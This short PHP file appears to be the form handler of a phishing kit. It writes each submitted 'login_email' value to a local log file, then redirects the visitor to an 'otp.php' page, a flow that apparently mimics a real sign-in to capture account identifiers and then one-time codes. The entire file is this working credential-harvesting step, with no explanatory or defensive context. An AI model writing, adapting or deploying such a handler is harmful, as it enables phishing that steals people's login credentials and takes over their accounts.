<?php

    file_put_contents("log.txt", "Email: " . $_POST['login_email'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();